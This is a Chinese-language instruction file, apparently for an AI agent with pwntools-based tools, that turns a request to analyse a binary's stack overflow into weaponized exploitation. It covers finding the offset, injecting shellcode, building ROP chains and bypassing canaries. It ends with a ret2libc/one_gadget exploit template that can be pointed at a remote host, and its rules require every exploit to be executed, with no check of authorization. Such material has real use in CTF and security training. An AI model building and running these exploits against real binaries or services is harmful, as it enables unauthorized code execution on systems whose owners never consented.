# Stack Overflow Exploit — 使用指南

## 触发条件
当用户要求分析二进制文件的栈溢出漏洞时，按以下步骤执行。

## Phase 1: 侦察
```
1. pwn_env()                          — 检查工具链完整性
2. inspect_binary(path=<binary>)      — checksec 查保护（NX/Canary/PIE/RELRO）
3. inspect_binary(path=<binary>)      — file 查架构（ELF 32/64）
```

## Phase 2: 偏移计算
```
1. pwn_cyclic(action="gen", length=200)    — 生成 de Bruijn 序列
2. pwn_debug(binary=<binary>,              — 喂入序列，读取崩溃偏移
     script="cyclic 200\nr\ninfo registers eip/rip")
3. pwn_cyclic(action="find", value=<crash_val>)  — 计算精确偏移
```

## Phase 3: 武器化

### 路径 A: NX 关闭 → 直接 shellcode
```python
from pwn import *
context.binary = elf = ELF("./binary")
shellcode = asm(shellcraft.sh())
payload = b"A" * offset + p64(stack_addr) + shellcode
```

### 路径 B: NX 开启 → ROP 链
```
1. pwn_rop(path=<binary>)                — 扫描 gadgets
2. pwn_libc(path=<binary>)               — 查找 libc 版本（若有泄露）
3. pwn_one_gadget(libc_path=<libc>)      — 查找 one_gadget 地址
```

### 路径 C: Canary 存在 → 泄露 Canary
```
1. 先用格式化字符串或部分覆写泄露 Canary
2. 再执行 ROP 链
```

## Phase 4: Exploit 脚本模板

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./BINARY")
context.log_level = "info"

# 如果远程
# io = remote("host", port)
io = elf.process()

offset = OFFSET_HERE  # Phase 2 计算结果

# ROP chain
rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])  # 泄露 libc
rop.call("main")                      # 回到 main 二次溢出

payload = b"A" * offset + rop.chain()
io.sendlineafter(b"> ", payload)

# 解析泄露地址
leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
log.success(f"puts@libc: {hex(leaked)}")

# 计算 libc 基址 + one_gadget
libc = ELF("./libc.so.6")
libc.address = leaked - libc.symbols["puts"]
one_gadget = libc.address + 0xONE_GADGET_OFFSET

# 第二次溢出
io.sendlineafter(b"> ", b"A" * offset + p64(one_gadget))
io.interactive()
```

## 关键规则
- **永远不要猜测偏移**，必须用 pwn_cyclic + pwn_debug 确认
- **NX 关闭时**不要用 ROP，直接 shellcode 更简单
- **Canary 存在时**必须先泄露再溢出
- 所有 exploit 脚本必须用 `run_code(use_venv=true, install_deps='pwntools')` 执行
